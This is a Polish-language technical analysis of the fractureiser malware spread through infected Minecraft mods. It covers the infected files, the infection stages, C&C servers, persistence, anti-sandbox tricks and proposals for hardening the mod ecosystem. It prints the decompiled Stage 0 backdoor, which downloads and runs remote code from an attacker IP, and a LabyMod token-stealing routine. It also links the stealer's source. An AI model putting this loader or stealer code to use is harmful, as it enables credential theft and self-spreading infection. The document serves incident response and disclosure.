# Informacje techniczne

## Dystrybucja

Niektóre paczki modyfikacji zostały zaktualizowane bez wiedzy autorów, dodając zależność od złośliwych modyfikacji. Te aktualizacje paczek modyfikacji zostały natychmiast zarchiwizowane po przesłaniu, co oznacza, że *nie są widoczne w interfejsie internetowym, ale tylko za pomocą interfejsu API*.

Złośliwe modyfikacje mają daty przesłania sprzed wielu tygodni. Większość z nich została przesłana przez konta jednorazowe o wyraźnie wygenerowanych nazwach i prawdopodobnie były początkiem infekcji. Luna Pixel Studios została skompromitowana, ponieważ jeden z deweloperów przetestował jedną z tych modyfikacji, ponieważ była to interesująca nowa wersja.

### Znane zainfekowane modyfikacje i wtyczki

Uwaga: Ta lista jest **niekompletna**. Została utworzona we wczesnych dniach śledztwa, a szybko zorientowaliśmy się, że zakres tego jest o wiele większy niż myśleliśmy, co czyniło śledzenie poszczególnych przypadków bezcelowym. Pozostawiono ją tu dla celów historycznych.

Zobacz również
[listę](https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/)
zainfekowanych projektów na CurseForge.

|mod/wtyczka|link(i)|SHA1|"Uploader"|
|---|---|---|---|
|Skyblock Core|[www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565](https://www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565) |`33677CA0E4C565B1F34BAA74A79C09A3B690BF41`|Luna Pixel Studios|
|Dungeonz|[legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100 (usunięte)](https://legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100) |`2DB855A7F40C015F8C9CA7CBAB69E1F1AAFA210B`|fractureiser|
|Haven Elytra|[dev.bukkit.org/projects/havenelytra/files/4551105 (usunięte)](https://dev.bukkit.org/projects/havenelytra/files/4551105)   [legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105 (usunięte)](https://legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105) |`284A4449E58868036B2BAFDFB5A210FD0480EF4A`|fractureiser|
|Vault Integrations|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (usunięte)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simpleharvesting82|
|AutoBroadcast|[www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257 (usunięte)](https://www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257)|`C55C3E9D6A4355F36B0710AB189D5131A290DF26`|shyandlostboy81|
|Museum Curator Advanced|[www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353 (usunięte)](https://www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353)|`32536577D5BB074ABD493AD98DC12CCC86F30172`|racefd16|
|Vault Integrations Bug fix|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (usunięte)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simplyharvesting82
|Floating Damage|[dev.bukkit.org/projects/floating-damage (usunięte)](https://dev.bukkit.org/projects/floating-damage)|`1d1aaccdc13244e980c0c024610ecc77ea2674a33a52129edf1bb4ce3b2cc2fc`|mamavergas3001
|Display Entity Editor|[www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122 (usunięte)](https://www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122)|`A4B6385D1140C111549D95EAB25CB51922EEFBA2`|santa_faust_2120

Darkhax przysłał to: https://gist.github.com/Darkhax/d7f6d1b5bfb51c3c74d3bd1609cab51f

możliwe, że więcej: Sophisticated Core, Dramatic Doors, Moonlight lib, Union lib

## Etap 0 (Zainfekowane pliki modów)

Zainfekowane modyfikacje lub wtyczki mają nową metodę `static void` wstawioną do swojej głównej klasy, a wywołanie tej metody jest wstawiane do statycznego inicjalizatora tej klasy. Dla DungeonZ, metoda nazywa się `_d1385bd3c36f464882460aa4f0484c53` i znajduje się w `net.dungeonz.DungeonzMain`. Dla Skyblock Core, metoda nazywa się `_f7dba6a3a72049a78a308a774a847180` i jest wstawiana do `com.bmc.coremod.BMCSkyblockCore`. Dla HavenElytra, kod jest wstawiany bezpośrednio do nieużywanego statycznego inicjalizatora `valorless.havenelytra.HavenElytra`.

Kod metody jest zaszyfrowany, używając `new String(new byte[]{...})` zamiast literałów ciągów tekstowych.

Z próbki D3SL "Create Infernal Expansion Plus", złośliwa wersja "Create Infernal Expansion Compat" z zainfekowanym kodem w głównej klasie modu:
```java
static void _1685f49242dd46ef9c553d8af1a4e0bb() {
  Class.forName(new String(new byte[] {
      // "Utility"
    85, 116, 105, 108, 105, 116, 121
  }), true, (ClassLoader) Class.forName(new String(new byte[] {
      // "java.net.URLClassLoader"
    106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114
  })).getConstructor(URL[].class).newInstance(new URL[] {
    new URL(new String(new byte[] {
        // "http"
      104, 116, 116, 112
    }), new String(new byte[] {
        // "85.217.144.130"
      56, 53, 46, 50, 49, 55, 46, 49, 52, 52, 46, 49, 51, 48
    }), 8080, new String(new byte[] {
        // "/dl"
        47, 100, 108
        }))
  })).getMethod(new String(new byte[] {
      // "run"
    114, 117, 110
  }), String.class).invoke((Object) null, "-114.-18.38.108.-100");
}
```

1. Tworzy `URLClassLoader` z adresem URL `http://[85.217.144.130:8080]/dl` ([shodan](https://www.shodan.io/host/85.217.144.130))
2. Ładuje klasę `Utility` z klasyfikatora, pobierając kod z internetu.
3. Wywołuje metodę `run` na `Utility`, przekazując inny argument typu String dla każdego zainfekowanego modułu (!). Na przykład:
   - Skyblock Core: "`-74.-10.78.-106.12`"
   - Dungeonz: "`-114.-18.38.108.-100`"
   - HavenElytra: "`-114.-18.38.108.-100`"
   - Vault Integrations: "`-114.-18.38.108.-100`"

Przekazane liczby są parsowane jako bajty przez etap 1 i zapisywane do pliku o nazwie ".ref". Wygląda na to, że są one sposobem śledzenia źródeł infekcji przez autora.

Utworzenie klasyfikatora jest hardcoded na ten adres URL i nie korzysta z adresu URL Cloudflare, którego używa Etap 1. Ponieważ ten adres IP jest teraz offline, oznacza to, że obciążenia Etapu 0 *o których obecnie wiemy* już nie działają.

## Etap 1 (`dl.jar`)

SHA-1: `dc43c4685c3f47808ac207d1667cc1eb915b2d82`

[Odszyfrowane pliki z złośliwym oprogramowaniem można znaleźć tutaj](../decomp).

Pierwszą rzeczą, jaką robi `Utility.run`, jest sprawdzenie, czy właściwość systemowa `neko.run` jest ustawiona. Jeśli tak, *natychmiast przestaje wykonywać się*. Jeśli nie, ustawia ją na pusty ciąg i kontynuuje. Wygląda na to, że złośliwe oprogramowanie próbuje uniknąć wielokrotnego wykonywania się, na przykład gdyby zainfekowało wiele modów. *Nie można na to polegać jako na mechanizmie zatrzymującym, ponieważ Etap 1 jest pobierany z Internetu i może ulec zmianie*.

Próbuje skontaktować się z adresem `85.217.144.130` i domeną Cloudflare Pages (`https://files-8ie.pages.dev/ip`). Raporty o nadużyciach zostały już wysłane. Domena Pages jest używana do pobrania adresu IP serwera C&C, jeśli pierwszy adres IP nie odpowiada - odpowiedź URL zawiera binarną reprezentację adresu IPv4.

*Adres IP C&C został zablokowany po zgłoszeniu nadużycia do dostawcy serwera. Będziemy musieli śledzić stronę Cloudflare, aby sprawdzić, czy zostanie uruchomiony nowy serwer C&C. Nie wyobrażam sobie, żeby nie przewidzieli tego.* Dziękujemy Serverion za szybką reakcję.

*Domena Cloudflare Pages została zakończona.* Nowy serwer C&C znajduje się pod adresem `107.189.3.101`.

Etap 1 próbuje osiągnąć trwałość, wykonując następujące czynności:
1. Pobieranie Etapu 2 (lib.jar w systemach Linux, libWebGL64.jar w systemach Windows) z serwera.
2. Ustawienie Etapu 2 do automatycznego uruchamiania podczas startu systemu:
   * W systemach Linux próbuje umieścić pliki jednostek systemd w `/etc/systemd/system` lub `~/.config/systemd/user`.
     * Plik jednostki umieszczony w folderze użytkownika nigdy nie działa, ponieważ próbuje używać `multi-user.target`, który nie istnieje dla jednostek użytkownika.
   * W systemach Windows próbuje zmodyfikować rejestr (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`) w celu uruchomienia samego siebie, a jeśli to się nie powiedzie, próbuje dodać siebie do folderu `Windows\Start Menu\Programs\Startup`.

## Etap 2 (`lib.jar` lub `libWebGL64.jar`)

Znane skróty SHA-1:
* `52d08736543a240b0cbbbf2da03691ae525bb119`
* `6ec85c8112c25abe4a71998eb32480d266408863` (wcześniejsze przesłane przez D3SL)

Etap 2 jest zaciemniony przy użyciu wersji demo obfuskatora Allatori, a jego główna klasa nosi nazwę `Bootstrap`.
Zawiera również inną klasę o nazwie `h`, która wydaje się być prostą klasą komunikacyjną, ale jest pusta.
Można zobaczyć próbę odtworzenia kodu źródłowego na stronie
https://gist.github.com/SilverAndro/a992f85bec29bb248c354ccf5d2206fe

Po uruchomieniu wykonuje następujące czynności:
1. Otwiera port `9655` i dodaje hook zamykający go, gdy jvm zostanie zamknięte.
2. Znajduje swoje umieszczenie na dysku i działa obok siebie.
3. Jeśli istnieje plik `.ref`, odczytuje klucz identyfikatora z pliku.
4. Uruchamia pętlę, aby:
    1. Sprawdzać `https://[files-8ie.pages.dev]:8083/ip` w celu sprawdzenia serwera i próby połączenia z nim.
    2. Otrzymuje flagę, czy sprawdzenie aktualizacji powinno kontynuować, zgłaszając błąd, jeśli nie (raportowane do serwera na porcie `1338`).
    3. Jeśli tak, otrzymuje skrót i sprawdza go z plikiem `client.jar`, jeśli istnieje, wysyłając bajt informujący, czy chce dokonać aktualizacji.
    4. Jeśli tak, otrzymuje i nadpisuje/tworzy `client.jar`, ukrywając go za pomocą atrybutów pliku.
    5. Wczytuje i wywołuje statyczną metodę `dev.neko.nekoclient.Client#start(InetAddress, refFileBytes)`.
    6. Uśpienie na 5 sekund.

## Etap 3 (`client.jar`)

sha-1: `c2d0c87a1fe99e3c44a52c48d8bcf65a67b3e9a5`
sha-1: `e299bf5a025f5c3fff45d017c3c2f467fa599915`

`client.jar` jest niezwykle zaszyfrowanym i skomplikowanym pakietem kodu zawierającym zarówno kod Java, jak i kod natywny.

Zawiera on natywny payload `hook.dll`, zdekompilowany: [link do kodu](https://gist.githubusercontent.com/NotNite/79ab1e5501e1ef109e8030059356b1b8/raw/c2102bf5ff74275ac44c2200d5121bfff652fd49/hook.dll.c)

W `client.jar` znajdują się dwie funkcje natywne, które mają być wywoływane z poziomu Javy, ponieważ są wywoływalne przez JNI:
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveClipboardFiles(__int64 a1);`
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveMSACredentials(__int64 a1);`

Z analizy wynika, że robią one to, co jest zapisane w ich nazwach:
* Odczytaj zawartość schowka
* Kradnij poświadczenia konta Microsoft

Jest także dowód na kod próbujący wykonać następujące czynności:
* Skanowanie *wszystkich* plików jar w systemie, które wyglądają jak mody do Minecrafta (poprzez wykrywanie Forge/Fabric/Quilt/Bukkit) lub [deklarujących klasę główną](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244) (większość zwykłych programów w Javie) i próba wstrzyknięcia Etapu 0 do nich
* Kradzież plików cookie i informacji logowania dla wielu przeglądarek internetowych
* Zamiana adresów kryptowalutowych w schowku na alternatywne, które prawdopodobnie są własnością atakującego
* Kradzież poświadczeń Discorda
* Kradzież poświadczeń Microsoft i Minecrafta z różnych launcherów
* Kradzież portfeli kryptowalutowych

Wykrywanie plików jar jako modów lub wtyczek do Minecrafta jest realizowane heurystycznie na podstawie następujących reguł:
* Forge (`dev/neko/e/e/e/A`): Malware próbuje zlokalizować adnotację `@Mod`, która jest wymagana we wszystkich modach
* Bukkit (`dev/neko/e/e/e/C`): Malware sprawdza, czy klasa rozszerza klasę `JavaPlugin` z Bukkita
* Fabric/Quilt (`dev/neko/e/e/e/i`): Malware sprawdza, czy klasa implementuje `ModInitializer`
* Bungee (`dev/neko/e/e/e/l`): Malware sprawdza, czy klasa rozszerza klasę `Plugin` z Bungee
* Vanilla (`dev/neko/e/e/e/c`): Malware sprawdza, czy główna klasa klienta `net.minecraft.client.main.Main` istnieje

## Etap3 (`unobf-client.jar`)

Około 2023-06-07 14:20 UTC klient jar etapu 3 został przypadkowo zastąpiony wersją niezaciemnioną. Możesz znaleźć archiwum tutaj: [https://github.com/clrxbl/NekoClient](https://github.com/clrxbl/NekoClient)

To potwierdza podejrzenia dotyczące zachowania/dowodów z analizy wcześniejszego zaciemnionego `client.jar`.

### Replikacja

Replikacja odbywa się poprzez automatyczne przetwarzanie klas w plikach jar na całym systemie plików na lokalnej maszynie. Dowolny plik jar, który zawiera klasy spełniające określone kryteria, może zostać zainfekowany. Proces skanowania lokalnego systemu plików i wstrzykiwania złośliwego kodu można znaleźć tutaj: [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L273)

Kryteria, które proces wyszukiwania sprawdza, można znaleźć tutaj: [`dev/neko/nekoinjector/template/impl`](https://github.com/clrxbl/NekoClient/tree/main/dev/neko/nekoinjector/template/impl)

* `BungeecordPluginTemplate` szuka interfejsu `net/md_5/bungee/api/plugin/Plugin` w klasach
* `FabricModTemplate` szuka interfejsu `net/fabricmc/api/ModInitializer` w klasach
* `ForgeModTemplate` szuka adnotacji `net/minecraftforge/fml/common/Mod` w klasach
* `MinecraftClientTemplate` szuka istnienia `net/minecraft/client/main/Main.class` i `net/minecraft/client/gui/GuiMultiplayer.class` w pliku jar
* `SpigotPluginTemplate` szuka nadtypu `org/bukkit/plugin/java/JavaPlugin` w klasach
* Jeśli żadna z powyższych opcji nie pasuje do klasy, [będzie próbować zainfekować główną klasę pliku jar](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244), jeśli istnieje.

Wstrzykiwany złośliwy kod to logika tylnych drzwi widziana w Etapie0. Sposób działania wstrzykiwania polega na zadeklarowaniu złośliwego kodu w klasie `Loader` w metodzie statycznej. Odpowiedzialna za wydobycie kodu z `Loader` i wstawienie go do nowych klas przeznaczonych do zainfekowania jest klasa `Injector` znajdująca się obok niej. Wartością zwracaną przez `Injector.loadInstallerNode(...)` jest `MethodNode`, który opisuje sam proces infekcji. Teraz wystarczy dodać tę metodę do docelowej klasy. W [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L272) wywołują `Entry.inject(MethodNode)`, aby to osiągnąć. Aby upewnić się, że złośliwa metoda jest wywoływana, metoda `inject` dodaje logikę do statycznego inicjalizatora docelowej klasy, która wywołuje dodaną metodę. Ponieważ inicjalizator statyczny jest uruchamiany podczas pierwszego wczytania klasy, a docelowa klasa to wtyczka/mod, założeniem jest, że ten kod będzie zawsze uruchamiany przez użytkowników, którzy uruchamiają zainfekowane paczki modów lub serwery. Następnie pakują plik jar ponownie z nowo zainfekowaną klasą docelową.

### Triki anty-sandboxowe

Czymś, czego zwykle nie spotyka się w złośliwym oprogramowaniu JVM, a co jest obecne tutaj, jest klasa o nazwie `VMEscape`. Sprawdza, czy znajduje się w [Windows Sandbox](https://learn.microsoft.com/en-us/windows/security/application-security/application-isolation/windows-sandbox/windows-sandbox-overview), sprawdzając, czy bieżący użytkownik to `WDAGUtilityAccount`. Jeśli warunek ten jest spełniony, następuje próba ucieczki z Windows Sandbox.

Proces wygląda mniej więcej tak:

- Uruchomienie powtarzającego się wątku do wykonania następujących czynności:
  - Utworzenie tymczasowego katalogu za pomocą `Files.createTempDirectory(...)`
  - Iterowanie po wpisach `FileDescriptor` w schowku systemowym, który odzwierciedla schowek hosta
  - Utworzenie skrótu, który wygląda jak oryginalny plik _(z wykorzystaniem ikon z SHELL32)_, ale w rzeczywistości uruchamia złośliwe oprogramowanie
  - Przypisanie tego skrótu do schowka, nadpisując oryginalne odwołanie do pliku

W rezultacie, jeśli użytkownik skopiuje plik i przejdzie do wklejenia go gdzie indziej, w rzeczywistości wklei skrót, który wygląda jak zamierzony plik, ale w rzeczywistości uruchamia złośliwe oprogramowanie.

### Kradzież danych

**Tokeny MSA**: Ponieważ ten mod jest ukierunkowany na mody Minecrafta, naturalne jest, że próbuje ukraść token MSA używany do logowania się do Minecrafta. Niektóre launchery przechowują te dane w lokalnym pliku, z którego to złośliwe oprogramowanie będzie próbować odczytać. Dotyczy to różnych launcheriów, takich jak:

* Launcher vanilla/mojang
* Starszy launcher vanilla/mojang
* PolyMC / Prism
* Technic
* Feather
* LabyMod (< v3.9.59)
* I wszelkich tokenów MSA znalezionych w [Windows Credential Manager](https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0)

Logika wydobycia (widoczna w [`dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java)) wygląda podobnie dla wielu elementów, ponieważ przechowują one te dane w podobny sposób. Oto przykład kodu dla LabyMod:

```java
private static void retrieveRefreshTokensFromLabyMod(List<RefreshToken> refreshTokens) throws IOException {
	String appdata = System.getenv("APPDATA");
	if (Platform.isWindows() || Objects.isNull(appdata)) {
		Path path = appdata == null ? null : Paths.get(appdata, ".minecraft", "LabyMod", "accounts.json");
		if (Files.isReadable(path)) {
			extractRefreshTokensFromLabyModLauncher(refreshTokens, Json.parse(Files.readString(path)).asObject());
		}
	}
}
```
Kod do pobierania tokenów z Feather/PolyMC/Prism jest praktycznie identyczny.

Zmiana w stosunku do tej strategii polega na tym, że Json ma dodatkową warstwę kryptografii ochrony.

Zmiana w stosunku do technic polega na przechowywaniu danych uwierzytelniających przez technic przy użyciu wbudowanej w Javie serializacji obiektów, opakowując typ `com.google.api.client.auth.oauth2.StoredCredential`.

**Tokeny Discord**: Każdy widział już kradzież tokena. Kradnie token oraz dodatkowe informacje, takie jak metody płatności, powiązany numer telefonu, itp. Dotyczy standardowego klienta, wersji canary, ptb i lightcord. Istotne źródło: [`dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java`](https://github.com/clrxbl/NekoClient/blob/fd76c5f9d40d1e10de11f00a6b4e0cca3d6221a3/dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java)

**Ciasteczka i zapisane dane uwierzytelniające**: Kradnie zapisane ciasteczka i dane uwierzytelniające zapisane w dotkniętych przeglądarkach. Istotne źródło: [`dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java)

- Mozilla Firefox
  - Waterfox
  - Pale Moon
  - SeaMonkey
- Chrome
  - Edge
  - Brave
  - Vivaldi
  - Yandex
  - Slimjet
  - CentBrowser
  - Comodo
  - Iridium
  - UCBrowser
  - Opera
    - Beta
    - Developer
    - Stable
    - GX
    - Crypto
  - CryptoTab

## Etap 3b (`dummyloader3.jar`)

Etap 3 został zastąpiony innym plikiem jar po pewnym czasie po uruchomieniu drugiego serwera C&C.

Wygląda na to, że jest to po prostu aktualizator SkyRage, który jest kolejnym szkodliwym oprogramowaniem Minecraft skierowanym przeciwko blackspigot.

### Trwałość
- Windows: Harmonogram zadań `MicrosoftEdgeUpdateTaskMachineVM`, plik `%AppData%\..\LocalLow\Microsoft\Internet Explorer\DOMStore\microsoft-vm-core`
- Linux: `/bin/vmd-gnu`, `/etc/systemd/system/vmd-gnu.service`, usługa `vmd-gnu`

### Połączenia
- Serwer C&C: `connect.skyrage.de`
- Pobieranie: `hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/qqqqqqqqq`

### Działania
- Plik `qqqqqqqqq` wyodrębnia różne informacje (ciasteczka przeglądarki, discord, minecraft

, epic games, dane logowania steam, a także kilka informacji o portfelach kryptowalut i menedżerach haseł), które plik aktualizujący wysyła na serwer C&C
- zastępuje adresy kryptowalut w schowku adresem otrzymanym z `95.214.27.172:18734`
- trwałość (patrz powyżej)
- zawiera automatyczne aktualizacje, obecna wersja to 932 (`hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/version`)

### Mapowanie

Oto mapowanie dla tego przykładu, które można zastosować za pomocą Enigma lub innego narzędzia obsługującego mapowanie Enigma.
```
KLASA D Chat
KLASA E ChatChain
KLASA E$a ChatChain$ChainLink
KLASA F ClientChat
KLASA G EncryptionRequest
KLASA H EncryptionResponse
KLASA H$a EncryptionResponse$EncryptionData
KLASA J KeepAlive
KLASA L LoginPayloadResponse
KLASA O PluginMessage
KLASA O$1 BungeeCordProtocolVersionMapFunction
KLASA P SetCompression
KLASA R StatusResponse
KLASA T CryptocurrencyClipboardLogger
KLASA T$1 CryptocurrencyClipboardLogger$LowLevelKeyboardHook
KLASA U AutoRunPersistence
KLASA V InputStreamFileWriter
KLASA W OperatingSystem
KLASA X AutoUpdater
KLASA Y StacktraceSerializer
KLASA a MalwareClientConnectionHandler
KLASA b Main
    POLA a intconst I
    POLA a string0 Ljava/lang/String;
    POLA a ipAddress Ljava/net/InetSocketAddress;
KLASA g MinecraftBot
KLASA h MinecraftBot2
KLASA o MinecraftFriendlyByteBuf
KLASA s MinecraftIPAddressResolver
KLASA t MinecraftPacketDecoder
KLASA y MinecraftPacketEncryption
```

### Anty-dekompilacja

Ten przykład wydaje się nadużywać technikalii w pliku klasy, aby powodować awarie narzędzi dekompilujących. Takie ataki można naprawić, używając [CAFED00D](https://github.com/Col-E/CAFED00D), analizatora kodu bajtowego, który filtrowuje uszkodzone atrybuty. Po tym jedynym pozostałym problemem jest podstawowa obfuskacja stosowana przez wersję demonstracyjną Allatori.

# Inne rzeczy

Szczegóły są dostępne w dokumencie dotyczącym odwrócenia etapu 3 na żywo: https://hackmd.io/5gqXVri5S4ewZcGaCbsJdQ

Kiedy drugi serwer C&C został uruchomiony, przez około 40 minut przypadkowo serwowana była odszyfrowana wersja etapu 3.

Główny serwer ładunku ~~jest~~ *był* (został wyłączony) hostowany przez firmę Serverion z siedzibą w Holandii.

Nowy serwer C&C został również wyłączony. _2023-06-07 18:51 UTC_

Oprócz serwera HTTP na porcie 80/443 i serwera SSH na porcie 22, otwarte były następujące porty na `85.217.144.130` i `107.189.3.101`:

* 1337
* 1338 (port wspomniany w pliku Etapu 1 do tworzenia nowego połączenia z debugerem)
* 8081 (jest to serwer WebSocket - obecnie brak widocznej funkcji, nie wspomniany w żadnym złośliwym kodzie)
* 8082 (nikt nie otrzymał z tego niczego, nie wspomniany w żadnym złośliwym kodzie)
* 8083 (skontaktowany przez Etap 1)

Ciekawostka: strona bukkit fractureisera mówi "Ostatnio aktywny: sob, 1 stycznia 2000, 00:00:00" https://dev.bukkit.org/members/fractureiser/projects/

## Przykłady

Proszę zapytać w czacie IRC o dostęp do próbek w trybie tylko do odczytu lub odczytu/zapisu. Kod źródłowy zdekompilowanego klienta Etapu 3 jest dostępny: https://github.com/clrxbl/NekoClient


## Dalsze działania

Podczas gdy jest jeszcze za wcześnie, aby mówić o długoterminowych dalszych działaniach, cała ta afera ujawniła kilka krytycznych wad w ekosystemie modów do Minecrafta. Ta sekcja to tylko burza mózgów na temat tych wad i jak możemy je poprawić.

#### 1. Niewystarczające recenzje w repozytoriach modów

Czym dokładnie zajmuje się CurseForge i Modrinth podczas "recenzowania" moda? Jako społeczność powinniśmy wiedzieć, zamiast polegać na bezpieczeństwie wynikającym z tajemnicy.
Czy powinniśmy uruchamiać jakąś formę statycznej analizy? (williewillus ma kilka pomysłów tutaj)

#### 2. Brak podpisywania kodu modów

W przeciwieństwie do branży oprogramowania jako całości, mody udostępniane i przesyłane do repozytoriów zwykle nie są podpisane kluczem, który potwierdza, że właściciel klucza przesłał mod. Posiadanie podpisu i oddzielnego mechanizmu dystrybucji/zaufania dla klucza pozwala zminimalizować ryzyko skompromitowania kont na CurseForge.

Jednak prowadzi to do większego problemu, jakim jest sposób ustalania zaufania do klucza, ponieważ fakt, że "ten plik jar ma ten podpis", musi być komunikowany poza obrębem CurseForge/Modrinth, w standardowy sposób, aby ładowacze lub użytkownicy mogli zweryfikować podpisy.
Forge próbował wprowadzić podpisywanie wiele lat temu, ale miało to ograniczone zastosowanie.

#### 3. Brak możliwości replikowalnych kompilacji

Narzędzia do tworzenia modyfikacji Minecrafta są chaotyczne, a kompilacje zwykle nie są replikowalne. Często zdarza się, że skrypty kompilacyjne pobierają nieprzypięte wersje losowych wtyczek Gradle i ich używają, co powoduje, że artefakty są niepowtarzalne i tym samym niepodlegające audytowi.

Należy wziąć pod uwagę, że losowa wtyczka Gradle może stać się potencjalnym wektorem ataku.

#### 4. Brak izolacji samego Minecrafta

Modyfikowanie wersji Java zawsze dawało pełną moc Javy, a to jest druga strona tej dwuobułej broni: złośliwy kod ma szeroki zasięg.
Sam Minecraft nie jest uruchamiany w żadnym systemie izolacji, a serwery zazwyczaj nie są izolowane, chyba że właściciel posiada odpowiednią wiedzę.

Dobra izolacja jest trudna, zwłaszcza na systemach takich jak Linux, gdzie SELinux/AppArmor mają tak słabe interfejsy użytkownika, że nikt ich nie wdraża.
